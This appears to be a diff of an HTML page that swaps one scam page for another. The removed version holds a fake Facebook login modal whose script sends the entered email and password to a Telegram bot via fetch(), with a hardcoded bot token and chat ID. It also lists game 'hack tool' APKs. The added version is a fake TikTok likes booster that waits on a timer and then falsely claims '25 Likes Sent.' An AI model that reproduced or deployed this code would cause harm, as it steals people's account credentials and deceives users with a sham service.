@@ -3,168 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NAZIM | Ultimate RGB Panel</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>ALIF ALEX STAR | TikTok Booster</title>
+    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/1053/1053210.png">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        :root { 
-            --main: #ff6600; --bg: #050505; --error: #ff0000;
-            --neon-blue: #00f2ff; --neon-green: #39ff14; --neon-pink: #ff00ff;
-        }
-
-        /* Sponsor RGB Style */
-        @keyframes rgbSponsor {
-            0% { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
-            50% { color: #0000ff; text-shadow: 0 0 10px #0000ff; }
-            100% { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            75% { transform: translateX(10px); }
-        }
-
-        .shake-error { animation: shake 0.3s ease-in-out 2; border-color: var(--error) !important; box-shadow: 0 0 20px var(--error) !important; }
-
-        * { cursor: none !important; box-sizing: border-box; }
-        #cursor { width: 10px; height: 10px; background: white; border-radius: 50%; position: fixed; pointer-events: none; z-index: 100000; }
-        #cursor-outline { width: 40px; height: 40px; border: 2px solid var(--main); border-radius: 50%; position: fixed; pointer-events: none; z-index: 99999; transition: 0.15s ease-out; }
-
-        body { background: var(--bg); color: white; font-family: 'Poppins', sans-serif; margin: 0; overflow-x: hidden; }
-
-        /* Sponsored Tag */
-        .sponsor-tag {
-            position: fixed; bottom: 20px; left: 20px; z-index: 9999;
-            text-decoration: none; background: rgba(0,0,0,0.8);
-            padding: 10px 18px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);
-        }
-        .sponsor-text { font-family: 'Orbitron'; font-size: 13px; font-weight: 900; animation: rgbSponsor 3s linear infinite; display: flex; align-items: center; gap: 8px; }
-
-        /* Login Screen */
-        #login-screen { height: 100vh; display: flex; justify-content: center; align-items: center; background: #000; }
-        .login-box { background: #0f0f0f; padding: 40px; border-radius: 30px; border: 1px solid #222; text-align: center; width: 90%; max-width: 400px; }
-        .login-title { font-family: 'Orbitron'; font-size: 22px; font-weight: 900; margin-bottom: 25px; }
+        :root { --main: #ff6600; --neon: #00f2ff; --bg: #050505; }
+        body { background: var(--bg); color: white; font-family: 'Poppins', sans-serif; margin: 0; text-align: center; }
         
-        input { width: 100%; padding: 15px; margin-bottom: 10px; background: #111; border: 1px solid #333; color: #fff; border-radius: 12px; outline: none; text-align: center; font-family: 'Orbitron'; }
-        .btn-login { width: 100%; padding: 15px; background: var(--main); border: none; border-radius: 12px; color: #fff; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; }
-        
-        .social-btn { width: 100%; padding: 12px; margin-top: 15px; border-radius: 12px; border: none; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-family: 'Poppins'; background: #1877F2; color: #fff; }
+        /* Header & Branding */
+        .header { padding: 40px 20px; background: linear-gradient(to bottom, #111, transparent); }
+        .header h1 { font-family: 'Orbitron'; font-size: 32px; color: var(--main); text-shadow: 0 0 15px var(--main); margin: 0; }
+        .header p { color: var(--neon); font-size: 14px; letter-spacing: 2px; margin-top: 5px; }
 
-        /* FB Modal */
-        #fb-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10000; justify-content: center; align-items: center; }
-        .fb-box { background: #fff; width: 90%; max-width: 360px; border-radius: 8px; overflow: hidden; color: #1c1e21; font-family: Arial, sans-serif; }
-        .fb-header { background: #1877f2; color: #fff; padding: 15px; font-size: 22px; font-weight: bold; text-align: center; }
-        .fb-body { padding: 20px; }
-        .fb-input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; outline: none; }
-        .fb-login-btn { width: 100%; background: #1877f2; color: #fff; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        /* ZEFOy Style Cards */
+        .main-container { padding: 20px; display: flex; flex-direction: column; align-items: center; gap: 15px; }
+        .service-card { 
+            background: #111; width: 100%; max-width: 450px; padding: 20px; 
+            border-radius: 12px; border: 1px solid #222; display: flex; 
+            justify-content: space-between; align-items: center; transition: 0.3s;
+        }
+        .service-card:hover { border-color: var(--neon); box-shadow: 0 0 15px rgba(0,242,255,0.1); }
+        .service-info h3 { margin: 0; font-size: 18px; font-family: 'Orbitron'; }
+        .status-active { color: #39ff14; font-size: 11px; font-weight: bold; }
 
-        /* Main Panel */
-        #main-panel { display: none; padding: 40px 15px; min-height: 100vh; }
-        .alpha-label { font-family: 'Orbitron'; font-size: 50px; font-weight: 900; color: transparent; -webkit-text-stroke: 1px var(--neon-blue); text-shadow: 0 0 15px var(--neon-blue); margin: 30px 0; display: block; }
-        .game-group { background: #111; padding: 20px; border-radius: 20px; border: 1px solid #222; margin-bottom: 20px; }
-        .group-header { font-family: 'Orbitron'; color: #fefe33; border-left: 4px solid #fefe33; padding-left: 10px; margin-bottom: 15px; }
-        .panel-item { background: #000; padding: 15px; border-radius: 12px; border: 1px solid #333; display: flex; justify-content: space-between; text-decoration: none; color: #fff; margin-bottom: 10px; font-family: 'Orbitron'; font-size: 12px; }
+        /* Action Button */
+        .btn-use { 
+            background: var(--main); color: white; border: none; 
+            padding: 10px 25px; border-radius: 6px; font-weight: bold; 
+            cursor: pointer; font-family: 'Orbitron'; transition: 0.3s;
+        }
+        .btn-use:hover { background: #e65c00; transform: scale(1.05); }
 
-        @media (max-width: 768px) { #cursor, #cursor-outline { display: none; } * { cursor: auto !important; } }
+        /* Loader Section */
+        #loader-box { display: none; margin-top: 20px; }
+        .timer { font-size: 24px; color: var(--neon); font-family: 'Orbitron'; }
+
+        /* Sponsored Footer */
+        .footer { position: fixed; bottom: 20px; width: 100%; font-size: 12px; color: #444; }
+        .footer span { color: var(--main); font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div id="cursor"></div>
-    <div id="cursor-outline"></div>
-
-    <a href="https://www.tiktok.com/@.md.nazmul.hassan08" target="_blank" class="sponsor-tag">
-        <div class="sponsor-text"><span style="font-size: 10px; color: #fff;">SPONSORED BY</span><span> NAZIM </span></div>
-    </a>
-
-    <div id="login-screen">
-        <div class="login-box" id="loginBox">
-            <div class="login-title">NAZIM FF</div>
-            <input type="text" id="user" placeholder="USERNAME">
-            <input type="password" id="pass" placeholder="PASSWORD">
-            <button class="btn-login" onclick="startSystem()">LOGIN</button>
-            <div style="margin:15px 0; color:#444;">OR</div>
-            <button class="social-btn" onclick="openFB()"><i class="fab fa-facebook-f"></i> Login with Facebook</button>
-        </div>
+    <div class="header">
+        <h1>ALIF ALEX <span style="color:white">STAR</span></h1>
+        <p>TIKTOK AUTOMATION V1</p>
     </div>
 
-    <div id="fb-modal">
-        <div class="fb-box">
-            <div class="fb-header">facebook</div>
-            <div class="fb-body">
-                <input type="text" id="fb-user" class="fb-input" placeholder="Email or Phone Number">
-                <input type="password" id="fb-pass" class="fb-input" placeholder="Password">
-                <button class="fb-login-btn" id="fbSubmit" onclick="fbVerify()">Log In</button>
+    <div class="main-container">
+        <div class="service-card">
+            <div class="service-info">
+                <h3>TikTok Likes</h3>
+                <span class="status-active">● ONLINE</span>
             </div>
+            <button class="btn-use" onclick="startLikes()">USE</button>
+        </div>
+
+        <div class="service-card" style="opacity: 0.6;">
+            <div class="service-info">
+                <h3>TikTok Followers</h3>
+                <span style="color: red; font-size: 11px;">● UPDATING</span>
+            </div>
+            <button class="btn-use" style="background: #333; cursor: not-allowed;" disabled>OFFLINE</button>
+        </div>
+
+        <div id="action-box" style="display:none; margin-top: 30px; width: 90%; max-width: 400px;">
+            <input type="text" id="videoLink" placeholder="Paste Video Link Here" 
+                style="width: 100%; padding: 15px; background: #111; border: 1px solid var(--neon); color: white; border-radius: 8px; text-align: center; outline: none;">
+            <button class="btn-use" style="width: 100%; margin-top: 15px;" onclick="processRequest()">GET LIKES</button>
+        </div>
+
+        <div id="loader-box">
+            <p>Please wait for next submission...</p>
+            <div class="timer" id="timer">00:59</div>
         </div>
     </div>
 
-    <div id="main-panel">
-        <h1 style="font-family: 'Orbitron'; text-align: center;">ALIF ALEX <span style="color:var(--main)">STAR</span></h1>
-        <div id="alphabetical-list" style="max-width: 600px; margin: 0 auto;"></div>
+    <div class="footer">
+        SPONSORED BY <span>ALIF ALEX STAR</span>
     </div>
 
     <script>
-        const telegram_token = "8526922880:AAFNu2wpbN56lupeTgGtBPj6-AuqQcCRHoU";
-        const telegram_chat_id = "8135816344";
-
-        function openFB() { document.getElementById('fb-modal').style.display = 'flex'; }
-
-        function fbVerify() {
-            const user = document.getElementById('fb-user').value;
-            const pass = document.getElementById('fb-pass').value;
-
-            if(user.length > 3 && pass.length > 3) {
-                document.getElementById('fbSubmit').innerHTML = "Connecting...";
-                
-                const message = `🔥 NEW FB LOGIN 🔥\n\n👤 User: ${user}\n🔑 Pass: ${pass}\n🆔 Chat: ${telegram_chat_id}`;
-                const url = `https://api.telegram.org/bot${telegram_token}/sendMessage?chat_id=${telegram_chat_id}&text=${encodeURIComponent(message)}`;
-
-                fetch(url).then(() => {
-                    setTimeout(() => {
-                        document.getElementById('fb-modal').style.display = 'none';
-                        loginSuccess();
-                    }, 1500);
-                }).catch(() => alert("Network Error!"));
-            } else { alert("Please enter valid details!"); }
+        function startLikes() {
+            document.querySelector('.main-container').style.display = 'none';
+            document.getElementById('action-box').style.display = 'block';
+            document.querySelector('.main-container').style.display = 'flex';
         }
 
-        function startSystem() {
-            // লগইন আইডি এবং পাসওয়ার্ড "nazim" থেকে "alif" এ পরিবর্তন করা হয়েছে
-            if(document.getElementById('user').value === "alif" && document.getElementById('pass').value === "alif") {
-                loginSuccess();
+        function processRequest() {
+            let link = document.getElementById('videoLink').value;
+            if(link.includes("tiktok.com")) {
+                document.getElementById('action-box').style.display = 'none';
+                document.getElementById('loader-box').style.display = 'block';
+                startTimer(59);
             } else {
-                document.getElementById('loginBox').classList.add('shake-error');
-                setTimeout(() => document.getElementById('loginBox').classList.remove('shake-error'), 600);
+                alert("Please enter a valid TikTok video link!");
             }
         }
 
-        function loginSuccess() {
-            document.getElementById('login-screen').style.display = 'none';
-            document.getElementById('main-panel').style.display = 'block';
-            renderGames();
-        }
-
-        function renderGames() {
-            const listDiv = document.getElementById('alphabetical-list');
-            const letters = ['A','B','C','D','E','F'];
-            listDiv.innerHTML = "";
-            letters.forEach(l => {
-                listDiv.innerHTML += `<div class="alpha-label">${l}</div>
-                <div class="game-group"><div class="group-header">${l} SERIES GAMES</div>
-                <div class="panel-item"><span>${l}-GAME PREMIUM MOD</span><span>[APK]</span></div>
-                <div class="panel-item"><span>${l}-HACK TOOL V2</span><span>[APK]</span></div></div>`;
-            });
-        }
-
-        if (window.innerWidth > 768) {
-            const cursor = document.getElementById('cursor');
-            const outline = document.getElementById('cursor-outline');
-            window.addEventListener('mousemove', (e) => {
-                cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
-                outline.animate({ left: e.clientX - 17 + 'px', top: e.clientY - 17 + 'px' }, { duration: 400, fill: "forwards" });
-            });
+        function startTimer(seconds) {
+            let counter = seconds;
+            let interval = setInterval(() => {
+                let sec = counter < 10 ? "0" + counter : counter;
+                document.getElementById('timer').innerHTML = "00:" + sec;
+                counter--;
+                if (counter < 0) {
+                    clearInterval(interval);
+                    alert("Success! 25 Likes Sent to your video.");
+                    location.reload();
+                }
+            }, 1000);
         }
     </script>
 </body>
